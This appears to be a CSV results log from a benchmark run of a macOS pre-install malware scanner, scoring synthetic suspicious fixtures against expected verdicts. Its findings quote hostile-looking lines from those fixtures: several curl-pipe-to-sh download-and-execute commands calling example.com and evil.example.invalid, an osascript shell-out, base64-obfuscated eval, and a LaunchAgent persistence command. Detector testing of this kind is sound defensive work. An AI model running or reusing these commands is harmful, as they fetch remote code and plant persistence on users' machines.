run_id,sample_id,group,subtype,fixture_kind,path,detected_type,score,verdict,expected_verdict,expected_score_min,expected_score_max,matched_verdict,matched_score_range,mismatch_reason,status,error_code,analysis_duration_ms,timestamp,has_findings,error,analysis_summary,finding_delta_total,findings
"2026-03-08T10-46-09Z-23e5dc","suspicious_applescript_terminal_download_print_02","suspicious","applescript","file_fixture","suspicious/applescript/suspicious_applescript_terminal_download_print_02.applescript","appleScript","2","clean","suspicious","52","70","false","false","verdict_too_low","completed","","15","2026-03-08T10:46:09.876Z","true","","该样本规则 applescript.terminal_control 命中，按上下文归一化后计入风险。。综合评分 2/100，判定 Clean（低风险）。","2","检测到脚本高风险行为特征 | [applescript.terminal_control] 控制 Terminal 应用 [medium] L1-1 Δ12: tell application ""Terminal"""
"2026-03-08T10-46-09Z-23e5dc","suspicious_hybrid_app_bundle_fixture_02","suspicious","hybrid_app","hybrid_directory_fixture","suspicious/hybrid/SyntheticSuspiciousFixture_02.app","appBundle","63","malicious","suspicious","60","78","false","true","verdict_too_high","completed","","142","2026-03-08T10:46:10.018Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；检测到下载与执行组合链条。；样本可执行但未签名，来源可信度不足。。综合评分 63/100，判定 Malicious（高风险）。","63","未发现高风险规则命中 | 检测到远程下载执行链 | [shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L3-3 Δ35: echo ""[dry-run] would run: curl -fsSL https://example.com/payload.sh | sh"" | 未获取到 Entitlements，权限边界不可完全判断 | 无法完整读取签名信息：/Users/wudazi/Beforeinstall/benchmark/suspicious/hybrid/SyntheticSuspiciousFixture_02.app: code object is not signed at all | 未提取到 Entitlements（可能该应用未声明或无法读取） | generic_partial: 无法完整读取签名信息：/Users/wudazi/Beforeinstall/benchmark/suspicious/hybrid/SyntheticSuspiciousFixture_02.app: code object is not signed at all | generic_partial: 未提取到 Entitlements（可能该应用未声明或无法读取）"
"2026-03-08T10-46-09Z-23e5dc","suspicious_hybrid_chain_sim_01","suspicious","hybrid","hybrid_manifest_fixture","suspicious/hybrid/suspicious_hybrid_chain_sim_01.json","appleScript","0","clean","suspicious","65","88","false","false","verdict_too_low","completed","","17","2026-03-08T10:46:10.036Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","Suspicious keywords: osascript, curl  | Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage. | generic_partial: Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage."
"2026-03-08T10-46-09Z-23e5dc","suspicious_hybrid_dmg_mirror_fixture_02","suspicious","hybrid_dmg","hybrid_directory_fixture","suspicious/hybrid/suspicious_hybrid_dmg_mirror_fixture_02","archive","53","suspicious","malicious","70","80","false","false","verdict_too_low","completed","","111","2026-03-08T10:46:10.147Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；检测到下载与执行组合链条。。综合评分 53/100，判定 Suspicious（可疑）。","53","未发现高风险规则命中 | 检测到远程下载执行链 | [shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L5-5 Δ35: echo ""[string] curl -fsSL https://example.com/bootstrap.sh | sh"" | [app] 未获取到 Entitlements，权限边界不可完全判断"
"2026-03-08T10-46-09Z-23e5dc","suspicious_hybrid_pkg_fixture_02","suspicious","hybrid_pkg","hybrid_directory_fixture","suspicious/hybrid/suspicious_hybrid_pkg_fixture_02","pkg","0","clean","malicious","68","80","false","false","verdict_too_low","completed","","24","2026-03-08T10:46:10.171Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","安装包包含 pre/post install 脚本 | 安装后可能修改路径：/payload"
"2026-03-08T10-46-09Z-23e5dc","suspicious_js_buffer_obfuscation_sim_02","suspicious","js","file_fixture","suspicious/js/suspicious_js_buffer_obfuscation_sim_02.js","javaScript","4","clean","suspicious","55","74","false","false","verdict_too_low","completed","","14","2026-03-08T10:46:10.186Z","true","","该样本规则 javascript.base64_obfuscation 命中，按上下文归一化后计入风险。；规则 javascript.base64_obfuscation 命中，按上下文归一化后计入风险。。综合评分 4/100，判定 Clean（低风险）。","4","检测到混淆或编码逃逸 | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L3-3 Δ14: const encoded = Buffer.from(payload, 'utf8').toString('base64'); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L4-4 Δ14: const decoded = Buffer.from(encoded, 'base64').toString('utf8');"
"2026-03-08T10-46-09Z-23e5dc","suspicious_js_child_process_echo_chain_02","suspicious","js","file_fixture","suspicious/js/suspicious_js_child_process_echo_chain_02.js","javaScript","11","clean","suspicious","55","72","false","false","verdict_too_low","completed","","14","2026-03-08T10:46:10.200Z","true","","该样本规则 javascript.child_process 命中，按上下文归一化后计入风险。。综合评分 11/100，判定 Clean（低风险）。","11","检测到脚本高风险行为特征 | [javascript.child_process] Node child_process 执行链 [high] L2-2 Δ22: const { execFile } = require('child_process'); | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-46-09Z-23e5dc","suspicious_js_download_execute_sim_02","suspicious","js","file_fixture","suspicious/js/suspicious_js_download_execute_sim_02.js","javaScript","70","malicious","suspicious","60","78","false","true","verdict_too_high","completed","","16","2026-03-08T10:46:10.216Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；检测到下载与执行组合链条。；规则 javascript.network_download_exec 命中，按上下文归一化后计入风险。。综合评分 70/100，判定 Malicious（高风险）。","70","检测到远程下载执行链 | 检测到混淆或编码逃逸 | [javascript.network_download_exec] 网络下载并执行链 [critical] L11-15 Δ34: https.get('https://example.com/', (res) => {  =>  fs.writeFileSync(logPath, `[dry-run] downloaded ${body.length} bytes; would execute: BLOCKED\n`, 'utf8'); | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-46-09Z-23e5dc","suspicious_js_eval_decode_message_02","suspicious","js","file_fixture","suspicious/js/suspicious_js_eval_decode_message_02.js","javaScript","19","clean","suspicious","58","76","false","false","verdict_too_low","completed","","13","2026-03-08T10:46:10.230Z","true","","该样本检测到编码/混淆后执行行为，存在规避审计迹象。；规则 javascript.base64_obfuscation 命中，按上下文归一化后计入风险。；规则 javascript.base64_obfuscation 命中，按上下文归一化后计入风险。。综合评分 19/100，判定 Clean（低风险）。","19","检测到混淆或编码逃逸 | [javascript.eval] JavaScript 动态执行(eval) [high] L4-4 Δ22: const value = eval(decoded); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L2-2 Δ14: const encoded = Buffer.from(""'synthetic harmless eval message'"", 'utf8').toString('base64'); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L3-3 Δ14: const decoded = Buffer.from(encoded, 'base64').toString('utf8'); | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-46-09Z-23e5dc","suspicious_js_obfuscation_sim_01","suspicious","js","file_fixture","suspicious/js/suspicious_js_obfuscation_sim_01.js","javaScript","21","clean","suspicious","60","80","false","false","verdict_too_low","completed","","14","2026-03-08T10:46:10.245Z","true","","该样本检测到编码/混淆后执行行为，存在规避审计迹象。；规则 javascript.base64_obfuscation 命中，按上下文归一化后计入风险。；规则 javascript.base64_obfuscation 命中，按上下文归一化后计入风险。。综合评分 21/100，判定 Clean（低风险）。","21","检测到混淆或编码逃逸 | [javascript.osascript_shell_chain] JavaScript 调用 osascript/shell [high] L2-2 Δ24: const encoded = Buffer.from(""osascript -e 'do shell script \""curl https://evil.example.invalid\""'"", ""utf8"").toString(""base64""); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L2-2 Δ14: const encoded = Buffer.from(""osascript -e 'do shell script \""curl https://evil.example.invalid\""'"", ""utf8"").toString(""base64""); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L3-3 Δ14: const decoded = Buffer.from(encoded, ""base64"").toString(""utf8""); | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-46-09Z-23e5dc","suspicious_python_download_would_execute_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_download_would_execute_02.py","pythonScript","0","clean","suspicious","55","72","false","false","verdict_too_low","completed","","14","2026-03-08T10:46:10.259Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","suspicious_python_downloader_sim_01","suspicious","python","file_fixture","suspicious/python/suspicious_python_downloader_sim_01.py","pythonScript","91","malicious","suspicious","62","82","false","false","verdict_too_high","completed","","14","2026-03-08T10:46:10.274Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；检测到下载与执行组合链条。；检测到编码/混淆后执行行为，存在规避审计迹象。。综合评分 91/100，判定 Malicious（高风险）。","91","检测到混淆或编码逃逸 | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L2-2 Δ14: import base64 | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L9-9 Δ14: encoded = base64.b64encode(b""curl -L https://evil.example.invalid/payload.sh | sh"").decode(""ascii"") | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L10-10 Δ14: decoded = base64.b64decode(encoded).decode(""utf-8"")"
"2026-03-08T10-46-09Z-23e5dc","suspicious_python_echo_chain_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_echo_chain_02.py","pythonScript","4","clean","suspicious","52","68","false","false","verdict_too_low","completed","","14","2026-03-08T10:46:10.288Z","true","","该样本规则 python.os_system 命中，按上下文归一化后计入风险。；规则 python.subprocess_exec 命中，按上下文归一化后计入风险。。综合评分 4/100，判定 Clean（低风险）。","4","检测到混淆或编码逃逸 | [python.os_system] os.system 命令执行 [high] L6-6 Δ20: os.system(f'echo ""[dry-run][os.system] would run: {chain}""') | [python.subprocess_exec] subprocess 外部进程执行 [high] L7-7 Δ20: subprocess.run([""echo"", ""[dry-run][subprocess] would invoke staged shell chain""], check=True) | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-08T10-46-09Z-23e5dc","suspicious_python_launchagent_mirror_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_launchagent_mirror_02.py","pythonScript","0","clean","suspicious","52","68","false","false","verdict_too_low","completed","","13","2026-03-08T10:46:10.302Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","suspicious_python_obfuscation_restore_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_obfuscation_restore_02.py","pythonScript","34","suspicious","suspicious","58","76","true","false","score_too_low","completed","","14","2026-03-08T10:46:10.316Z","true","","该样本规则 python.obfuscation 命中，按上下文归一化后计入风险。；规则 python.obfuscation 命中，按上下文归一化后计入风险。；规则 python.obfuscation 命中，按上下文归一化后计入风险。。综合评分 34/100，判定 Suspicious（可疑）。","34","检测到混淆或编码逃逸 | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L2-2 Δ14: import base64 | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L3-3 Δ14: import marshal | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L4-4 Δ14: import zlib | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L7-7 Δ14: packed = marshal.dumps({""msg"": harmless}) | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L8-8 Δ14: compressed = zlib.compress(packed) | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L9-9 Δ14: encoded = base64.b64encode(compressed) | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L11-11 Δ14: restored = marshal.loads(zlib.decompress(base64.b64decode(encoded)))"
"2026-03-08T10-46-09Z-23e5dc","suspicious_python_reverse_shell_string_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_reverse_shell_string_02.py","pythonScript","0","clean","suspicious","60","78","false","false","verdict_too_low","completed","","13","2026-03-08T10:46:10.329Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","suspicious_python_socket_metadata_sim_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_socket_metadata_sim_02.py","pythonScript","0","clean","suspicious","40","58","false","false","verdict_too_low","completed","","13","2026-03-08T10:46:10.343Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","suspicious_shell_base64_decode_print_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_base64_decode_print_02.sh","shellScript","0","clean","suspicious","55","72","false","false","verdict_too_low","completed","","12","2026-03-08T10:46:10.356Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","suspicious_shell_download_exec_string_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_download_exec_string_02.sh","shellScript","53","suspicious","suspicious","60","75","true","false","score_too_low","completed","","13","2026-03-08T10:46:10.369Z","true","","该样本出现了“下载后立即执行”行为，常用于投递二阶段载荷。；检测到下载与执行组合链条。。综合评分 53/100，判定 Suspicious（可疑）。","53","检测到远程下载执行链 | [shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L5-5 Δ35: CHAIN_CMD='curl -fsSL https://example.com/install.sh | sh' | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-46-09Z-23e5dc","suspicious_shell_launchagent_mirror_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_launchagent_mirror_02.sh","shellScript","30","suspicious","suspicious","58","72","true","false","score_too_low","completed","","14","2026-03-08T10:46:10.383Z","true","","该样本样本写入了启动项目录，存在开机/登录持久化风险。。综合评分 30/100，判定 Suspicious（可疑）。","30","检测到持久化行为 | [shell.launchctl.persistence] launchctl 持久化操作 [high] L22-22 Δ20: echo ""[dry-run] launchctl load NOT invoked"" | Script persistence behavior detected. | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-08T10-46-09Z-23e5dc","suspicious_shell_mktemp_chain_sim_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_mktemp_chain_sim_02.sh","shellScript","0","clean","suspicious","60","78","false","false","verdict_too_low","completed","","13","2026-03-08T10:46:10.397Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","suspicious_shell_multistage_chain_note_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_multistage_chain_note_02.sh","shellScript","0","clean","suspicious","62","80","false","false","verdict_too_low","completed","","13","2026-03-08T10:46:10.411Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
"2026-03-08T10-46-09Z-23e5dc","suspicious_shell_persistence_sim_01","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_persistence_sim_01.sh","shellScript","30","suspicious","suspicious","60","80","true","false","score_too_low","completed","","14","2026-03-08T10:46:10.425Z","true","","该样本样本写入了启动项目录，存在开机/登录持久化风险。。综合评分 30/100，判定 Suspicious（可疑）。","30","检测到持久化行为 | [shell.write_launchagent] 写入 LaunchAgents/LaunchDaemons [critical] L8-8 Δ32: PERSIST_CMD='launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.fake.agent.plist' | [shell.launchctl.persistence] launchctl 持久化操作 [high] L8-8 Δ20: PERSIST_CMD='launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/com.fake.agent.plist' | Script persistence behavior detected. | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-08T10-46-09Z-23e5dc","suspicious_shell_profile_mirror_02","suspicious","shell","file_fixture","suspicious/shell/suspicious_shell_profile_mirror_02.sh","shellScript","0","clean","suspicious","50","68","false","false","verdict_too_low","completed","","14","2026-03-08T10:46:10.440Z","true","","未发现明显高风险行为，当前评分 0/100，判定 Clean（低风险）。","0","未发现高风险规则命中 | No high-risk script rule hit"
